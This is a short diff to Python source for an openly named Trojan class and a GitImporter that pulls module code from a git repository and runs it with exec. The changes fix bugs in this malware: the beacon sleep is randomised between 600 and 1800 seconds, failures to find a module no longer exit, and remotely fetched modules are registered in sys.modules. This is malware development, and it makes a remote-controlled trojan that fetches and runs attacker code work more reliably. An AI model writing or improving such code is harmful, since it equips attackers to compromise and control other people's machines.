@@ -72,7 +72,7 @@ class Trojan:
                 t.start()
                 time.sleep(random.randint(1, 10))
             
-            time.sleep(600, 1800)
+            time.sleep(random.randint(600, 1800))
 
 class GitImporter:
     def __init__(self):
@@ -94,13 +94,13 @@ class GitImporter:
             print(f'[-] {module_content} not found in your repo at modules/')
         except Exception as e:
             print(f'[-] Something went wrong while finding module: {e}')
-        else:
-            sys.exit(1)
+        return None
     
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
         exec(self.module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
         return new_module
 
 if __name__ == '__main__':
